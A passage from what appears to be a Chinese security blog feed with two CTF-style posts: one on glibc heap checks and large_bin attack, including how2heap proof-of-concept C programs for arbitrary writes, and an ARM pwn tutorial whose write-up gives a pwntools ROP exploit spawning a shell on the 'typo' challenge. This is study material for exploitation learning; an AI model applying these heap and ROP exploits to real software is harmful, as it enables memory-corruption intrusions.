class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">           || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">           || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">         malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><p>​malloc时增加了以下四项检查：</p><ul><li>下一个chunk的size是否在合理区间</li><li>下一个chunk的prevsize是否等于victim的size</li><li>检查unsortedbin双向链表的完整性</li><li>下一个chunk的previnuse标志位是否为0</li></ul><p>也就是说，在2.29以后unsorted_bin attack基本也退出历史舞台了，很少能用的到了，基本被large_bin attck所替代了，检查双向链表的完整性，即检擦了victim的fd,也检查了bck的fd，所以要想使用这个手法，要提前知道heap地址和libc地址才可以。</p><p>此外，house of force 在2.29以后也退出了历史舞台，原因是增加了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<span class="comment">//0x21000</span></span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure><p>需要检查top_chunk的size,需要小于等于 system_mems,所以基本失效了。</p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin attack"></a>large_bin attack</h2><p>large_bin attack主要是在unsorted—bin里的chunk，进入large_bin的时候，出现的问题，一共两种常见的利用方式。</p><ul><li><p>在申请largebin的过程中，伪造largebin的bk_nextsize，实现非预期内存申请。</p></li><li><p>在largebin插入的过程中，伪造largebin的bk_nextsize以及bk，实现任意地址写堆地址。</p></li></ul><h3 id="申请时利用："><a href="#申请时利用：" class="headerlink" title="申请时利用："></a>申请时利用：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">          &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">            &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize; <span class="comment">//寻找堆块</span></span><br><span class="line">                </span><br><span class="line">......</span><br><span class="line">​</span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//unlin</span></span><br></pre></td></tr></table></figure><p>只要目标地方符合unlink就可以通过检查了。</p><h3 id="插入时利用（任意地址写入堆地址）"><a href="#插入时利用（任意地址写入堆地址）" class="headerlink" title="插入时利用（任意地址写入堆地址）"></a>插入时利用（任意地址写入堆地址）</h3><p>在我们将chunk1放入large_bin后，我们通过修改chunk1的bk_next_size为target_addr - 0x20，此时 unsorted_bin中有一个large_chunk，我称之为chunk2,但是chunk2的地址size要大于chunk1的size，同时两个size在同一个bin的index范围内。此时我们再malloc任意size的chunk即可将chunk2链入chunk1中去，此时我们target_addr的内容，就会被修改成chunk2的地址。</p><p>看以下how2heap</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g -no-pie largebin.c -o largebin</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"> </span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">     <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">     <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">free</span>(p1);</span><br><span class="line">     <span class="built_in">free</span>(p2);</span><br><span class="line"></span><br><span class="line">     <span class="type">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">free</span>(p3);</span><br><span class="line"> </span><br><span class="line">     p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">     p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">     p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">     p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">     p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="libc2-31后的large-bin-attack"><a href="#libc2-31后的large-bin-attack" class="headerlink" title="libc2.31后的large_bin attack"></a>libc2.31后的large_bin attack</h2><p>2.30以后新增了两个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>这两个检查直接导致了，之前的large_bin attack死掉了。</p><p>然后再看看新的largebin_attack,实现利用的代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chunk1进入largebin后，此时有一个chunk2（size大于chunk1）,我们修改chunk1的bk_next_size为targe-0x20,此时再通过malloc将chunk2挂载进largebin，此时target被修改成chunk2的地址。</p><h3 id="how-to-heap"><a href="#how-to-heap" class="headerlink" title="how to heap"></a>how to heap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">        fwd = bck;</span></span><br><span class="line"><span class="comment">        bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This prevents the traditional large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here is the target we want to overwrite (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;First, we allocate a large chunk [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;And another chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We also allocate a second large chunk [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This chunk should be smaller than [p1] and belong to the same large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Once again, allocate a guard chunk to prevent consolidate\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the larger of the two --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Allocate a chunk larger than [p1] to insert [p1] into large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Free the smaller of the two --&gt; [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;At this point, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ARMPWN入门</title>
      <link href="/2022/07/01/armpwn%E5%85%A5%E9%97%A8/"/>
      <url>/2022/07/01/armpwn%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="ARMPWN入门"><a href="#ARMPWN入门" class="headerlink" title="ARMPWN入门"></a>ARMPWN入门</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>安装ARM软件包</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-arm-linux-gnueabi</span><br><span class="line">sudo apt-get install gcc-aarch64-linux-gnu</span><br></pre></td></tr></table></figure><ul><li>安装qume</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user qemu-system</span><br></pre></td></tr></table></figure><ul><li>安装gdb-multiarch</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure><h2 id="ubuntu编译arm架构程序并用qemu执行"><a href="#ubuntu编译arm架构程序并用qemu执行" class="headerlink" title="ubuntu编译arm架构程序并用qemu执行"></a>ubuntu编译arm架构程序并用qemu执行</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译</span></span><br><span class="line">arm-linux-gcc -g easyarm.c -o eastgets</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">qemu执行 动态链接程序，需要指定libc的位置</span></span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabihf/ ./pwn</span><br></pre></td></tr></table></figure><h2 id="qemu调试arm用户态程序"><a href="#qemu调试arm用户态程序" class="headerlink" title="qemu调试arm用户态程序"></a>qemu调试arm用户态程序</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用qemu-arm将程序运行起来，并指定一个端口用于连接gdb</span></span><br><span class="line">qemu-arm -g xxx ./arm-bin</span><br><span class="line">qemu-arm -L ./libc ./arm-bin（-L 参数可以指定libc的路径 可选）</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用gdb-multiarch指定arm程序</span></span><br><span class="line">gdb-multiarch ./arm-bin</span><br><span class="line"><span class="meta prompt_">gef&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture arm</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gef&gt; <span class="built_in">set</span> endian little</span></span><br><span class="line"><span class="meta prompt_">gef&gt; </span><span class="language-bash">target remote :xxx</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb-multiarch指定config文件</span></span><br><span class="line">gdb-multiarch -x mygdb.cfg ./arm-bin</span><br></pre></td></tr></table></figure><h2 id="qemu调试mips程序也一样"><a href="#qemu调试mips程序也一样" class="headerlink" title="qemu调试mips程序也一样"></a>qemu调试mips程序也一样</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动mips应用程序，并指定调试端口</span></span><br><span class="line">qemu-mips -g xxx ./mips-bin</span><br><span class="line">qemu-mips -g xxx -L ./ ./mips-bin  # 使用-L指定包含动态库的lib/目录</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">gdb-multiarch启动调试</span></span><br><span class="line">gdb-multiatch ./mips-bin</span><br><span class="line"><span class="meta prompt_">gef&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture mips</span></span><br><span class="line"><span class="meta prompt_">gef&gt; </span><span class="language-bash"><span class="built_in">set</span> endian big</span></span><br><span class="line"><span class="meta prompt_">gef&gt; </span><span class="language-bash">target remote :xxx</span></span><br></pre></td></tr></table></figure><h2 id="例题typo"><a href="#例题typo" class="headerlink" title="例题typo"></a>例题typo</h2><p>file指令查看文件相关数据：</p><p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630160649274.png" alt="image-20220630160649274"></p><p>32bit，小端序，静态链接，arm架构</p><p>运行程序试试：</p><p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630161315850.png" alt="image-20220630161315850"></p><p>ida里，通过字符串交叉引用查询输入点所在位置：</p><p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630161410947.png" alt="image-20220630161410947"></p><p>输入时，尝试输入大量数据，程序果然崩掉了</p><p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630161906789.png" alt="image-20220630161906789"></p><p>pwndbg调试计算偏移量：</p><p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630224228900.png" alt="image-20220630224228900"></p><p>存在栈溢出，偏移量112，然后直接进行ROP就可以了。</p><p>找gadget:</p><p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630225818049.png" alt="image-20220630225818049"></p><p>arm架构下32bit程序，函数的前四个参数分别保存在r0~r3寄存器中，其余的参数在栈中，函数返回值保存在寄存器r0中。所以构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./typo&quot;</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;arm&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_r0_r4_pc = <span class="number">0x00020904</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Input ~ if you want to quit&#x27;</span>)</span><br><span class="line">r.sendline()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;------Begin------&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(p_r0_r4_pc) + p32(<span class="number">0x0006C384</span>)*<span class="number">2</span> + p32(<span class="number">0x110B4</span>)</span><br><span class="line">r.sendline(pl1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell</p><p><img src="C:\Users\26505\AppData\Roaming\Typora\typora-user-images\image-20220630230826892.png" alt="image-20220630230826892"></p><p>总结：题目去了符号表真好恶心，明明蛮简单的一道题目，逆了好久。</p><h2 id="一些arm的知识"><a href="#一些arm的知识" class="headerlink" title="一些arm的知识"></a>一些arm的知识</h2><p>arm32</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 